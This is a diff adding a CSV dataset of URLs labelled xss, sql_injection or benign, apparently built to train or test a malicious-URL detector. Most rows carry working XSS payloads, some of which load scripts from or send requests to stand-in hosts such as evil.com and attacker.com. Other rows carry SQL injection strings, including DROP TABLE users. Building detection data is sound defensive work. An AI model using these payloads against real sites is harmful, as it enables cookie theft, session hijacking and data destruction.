@@ -1,0 +1,153 @@
+url,label
+"http://site.com?q=<body onload=alert('xss')>",xss
+"http://shop.com/?input=%3Cscript%3Ealert('x')%3C%2Fscript%3E",xss
+"http://victim.com/search?q=<script>alert('XSS')</script>",xss
+"http://page.com/?value=%22%3E%3Cscript%3Ealert(1)%3C/script%3E",xss
+"http://comments.com/post?id=5&comment=<img src=x onerror=alert('x')>",xss
+"http://target.com/data?name=<iframe src=javascript:alert(1)>",xss
+"http://vulnsite.com/login?user=<script>alert(document.cookie)</script>",xss
+"http://site.com/search?q=%3Csvg%20onload%3Dalert(1)%3E",xss
+"http://example.org/page?<script>alert(123)</script>",xss
+"http://demo.com/form?input=<img src=x onerror=alert('Hacked')>",xss
+"http://abc.com/index?q=<script>alert('xss')</script>",xss
+"http://test.com/x?val=%3Cscript%3Ealert(99)%3C/script%3E",xss
+"http://malicious.net/track?<script>alert(7)</script>",xss
+"http://injectxss.com/?<img src=x onerror=alert(3)>",xss
+"http://xssattack.com/?q=<svg onload=alert(8)>",xss
+"http://insecure.com/?q=<script>alert(document.cookie)</script>",xss
+"http://hacker.site/?input=<svg onload=alert(1)>",xss
+"http://test.org/?id=%3Ciframe%20src=javascript:alert(2)%3E",xss
+"http://xssme.com/page=<script>confirm('xss')</script>",xss
+"http://blog.com/comment=<img src=x onerror=alert(1337)>",xss
+"http://input.insecure.org/?query=<video src=1 onerror=alert('x')>",xss
+"http://site.com/#<svg onload=alert(3)>",xss
+"http://evil.com/form?data=<script src='http://malicious.com/xss.js'></script>",xss
+"http://unsafe.io/?search=<body onload=alert('xss')>",xss
+"http://form.xyz.com/comment=%22%3E%3Cscript%3Ealert(1)%3C/script%3E",xss
+"http://xss.me/?q=<script>alert(1)</script>",xss
+"http://site.com/input=<img src=x onerror=alert('xss')>",xss
+"http://test.org/?id=%3Ciframe%20src=javascript:alert(2)%3E",xss
+"http://app.com/login?redirect=<svg onload=alert(1)>",xss
+"http://form.insecure.com/comment=%3Cscript%3Econfirm('x')%3C/script%3E",xss
+"http://site.com/auth?user=' OR 1=1 --",sql_injection
+"http://example.com/search?q=test'%20OR%20'1'%20=%20'1",sql_injection
+"http://example.com/items?id=10 OR 1=1",sql_injection
+"http://bank.com/transfer?amount=1000&to=1234; DROP TABLE users;",sql_injection
+"http://example.com/login?username=admin'--&password=",sql_injection
+"http://abc.com/query=' or 'x'='x",sql_injection
+"http://demo.com/products?id=1' OR '1'='1'",sql_injection
+"http://mysite.com/info?id=1 AND 1=1",sql_injection
+"http://vulnerable.com/login?user=admin'--",sql_injection
+"http://shop.com/item?id=1'%20OR%20'1'%20=%20'1",sql_injection
+"http://portal.net/?query=' OR 1=1#",sql_injection
+"http://datahub.org/page.php?id=-1' OR '1'='1",sql_injection
+"http://school.com/form?student=' OR '' = '",sql_injection
+"http://example.org/items?id=5 AND 1=1",sql_injection
+"http://malicious.site?q=abc';--",sql_injection
+"http://unsafe.com/?id=' OR sleep(5)--",sql_injection
+"http://target.com/search?term=' OR EXISTS(SELECT *)",sql_injection
+"http://sqltest.com/user=' OR 1=1#",sql_injection
+"http://attack.com/index?id=2 UNION SELECT ALL",sql_injection
+"http://secure.com/login?email=admin'--",sql_injection
+"http://adminportal.com?id=1; DROP TABLE users;--",sql_injection
+"http://api.example.com?id=1'%20OR%20'1'%20=%20'1",sql_injection
+"http://unsafe.com/search?q=1' OR 1=1 LIMIT 1;--",sql_injection
+"http://exploit.net/?id=1' AND '1'='1",sql_injection
+"http://example.com/home",benign
+"https://profile.social.com/view?user=john_doe",benign
+"https://shopping.com/products?category=books",benign
+"http://newsportal.com/article?id=4523",benign
+"http://docs.site.com/download?file=report.pdf",benign
+"http://weatherinfo.com/today?location=delhi",benign
+"https://edu-site.org/login?user=student&pass=1234",benign
+"https://movies.com/watch?id=9876",benign
+"http://library.org/books/search?title=python",benign
+"https://flightbooker.com/search?from=nyc&to=del",benign
+"http://bank.com/branches",benign
+"https://calendar.com/events/view?id=1001",benign
+"https://store.com/cart?item=shirt&qty=2",benign
+"http://portal.site.org/dashboard?user=admin",benign
+"https://blog.example.net/posts?id=5432",benign
+"https://news.com/article?id=2024",benign
+"https://calendar.google.com/event?id=1280",benign
+"https://shop.example.com/view-product?id=812",benign
+"https://edu.org/library?q=machine+learning",benign
+"https://weatherapp.com/api/forecast?city=mumbai",benign
+"https://docs.io/open?file=report2022.pdf",benign
+"https://user.dashboard.com/settings",benign
+"https://store.com/cart?product=123&qty=2",benign
+"https://support.example.com/contact",benign
+"https://securebank.com/login",benign
+"http://blog.net/?q=<script>alert(42)</script>",xss
+"http://site.com/view?<svg onload=alert('x')>",xss
+"http://abc.in/?data=<img src=x onerror=alert('x')>",xss
+"http://page.org/path?q=<body onload=confirm('xss')>",xss
+"http://target.com/#<script>alert(document.cookie)</script>",xss
+"http://upload.site.com?q=<script>fetch('http://evil.com')</script>",xss
+"http://test.com/?id=%3Cscript%3Ealert('hello')%3C/script%3E",xss
+"http://login.org/auth=<iframe src=javascript:alert(1)>",xss
+"http://unsafe.org/form=<object data=javascript:alert('x')>",xss
+"http://code.org/embed=<svg%20onload=prompt('xss')>",xss
+"http://test.net?redirect=<script>alert('x')</script>",xss
+"http://app.site/?input=<img src=x onerror=alert('img')>",xss
+"http://shop.com/filter?q=<script>console.log('x')</script>",xss
+"http://user.net/prof=<svg onload=confirm('run')>",xss
+"http://host.com/api?data=%3Cimg%20onerror%3Dalert(1)%3E",xss
+"http://xss.site.com?u=<video src=1 onerror=alert('x')>",xss
+"http://sneaky.io/view?msg=<script>window.location='http://evil'</script>",xss
+"http://store.net/#<iframe src='javascript:alert(3)'>",xss
+"http://example.in/?q=<embed src=javascript:alert(5)>",xss
+"http://test.net/path?<script>alert('XSS')</script>",xss
+"http://mock.com/page?q=<img src=error onerror=alert('x')>",xss
+"http://attack.site/?code=%3Cscript%3Edocument.body%3C/script%3E",xss
+"http://vulnbox.net/page=<script>alert(String.fromCharCode(88))</script>",xss
+"http://web.com/test=<svg%20onload=alert(10)>",xss
+"http://click.me/path?msg=%3Cscript%3Ealert(1)%3C/script%3E",xss
+"http://mysite.org/?ref=<object data='javascript:alert(9)'>",xss
+"http://notes.io/?txt=%3Csvg%20onload=prompt(7)%3E",xss
+"http://bank.example/view=<script>history.back()</script>",xss
+"http://alerts.io/info?q=<img src=x onerror=alert('js')>",xss
+"http://attackbox.org/home=<svg onload=alert(6)>",xss
+"http://mysite.com?q=%3Cscript%3Ewindow.location='http://bad.com'%3C/script%3E",xss
+"http://vuln.org/view?html=<script>document.location='xss'</script>",xss
+"http://evil.com/#<iframe%20src=javascript:alert('xss')>",xss
+"http://attackpage.com/login?redirect=<script>confirm('test')</script>",xss
+"http://example.com?q=%3Csvg%20onload%3Dalert(5)%3E",xss
+"http://input.net/?msg=<script%20src='http://evil.io/xss.js'></script>",xss
+"http://redirect.io/next=<script>window.alert('xss')</script>",xss
+"http://unsafe.page.com/path?q=<img%20onerror=alert(7)>",xss
+"http://target.app.com/#<object%20data=javascript:alert('hi')>",xss
+"http://testurl.com/search?query=<script>alert(document.cookie)</script>",xss
+"http://commentbox.com/?text=<img src=x onerror='alert(\"oops\")'>",xss
+"http://data.com/path?q=<svg/onload=alert(1)>",xss
+"http://admin.com/auth?input=%3Cscript%3Eeval('alert(9)')%3C/script%3E",xss
+"http://hackthis.com/search?q=<embed src='javascript:alert(1)'>",xss
+"http://xssbox.org/payload?xss=%3Cimg%20src=1%20onerror=alert('boom')%3E",xss
+"http://badinput.com/?r=<marquee%20onstart=alert('xss')>",xss
+"http://sniff.io/?url=%3Cscript%3Ealert(navigator.userAgent)%3C/script%3E",xss
+"http://site.infect.com/?<svg%20onload='alert(`XSS`)'>",xss
+"http://echo.test/?message=<script>alert(666)</script>",xss
+"http://users.site.com/page=<script>top.location='http://evil'</script>",xss
+"http://example.com?q=<script>alert('test')</script>",xss
+"http://vuln.io/?search=<IMG SRC=javascript:alert('XSS')>",xss
+"http://news.com/article?id=' OR 'a'='a",sql_injection
+"http://online.com/login?user=admin'--&pass=",sql_injection
+"http://legit.com/view?ref=home",benign
+"http://safe.shop.com/item?id=123",benign
+"http://form.io/?comment=<svg onload=alert(99)>",xss
+"http://data.com/api?user=' OR 1=1#",sql_injection
+"http://update.example.com/?next=dashboard",benign
+"http://redirect.me/?next=http://evil.com",benign
+"http://target.in/?value=<iframe src='javascript:alert(1)'>",xss
+"http://test.net/search?q=test'%20OR%20'1'%20=%20'1",sql_injection
+"http://shop.org/products?name=shoes",benign
+"http://xss.trap.com/input=<script>new Image().src='http://evil.com'</script>",xss
+"http://demo.site/?input=<object data=javascript:alert('x')>",xss
+"http://myapp.org/user?id=10 AND 1=1",sql_injection
+"http://info.page.com/data=<body onload=alert('xss')>",xss
+"http://library.net/book?id=4321",benign
+"http://api.org/auth?name=' OR sleep(5)#",sql_injection
+"http://click.site.com/?a=<script src=http://attacker.com/xss.js></script>",xss
+
+
+
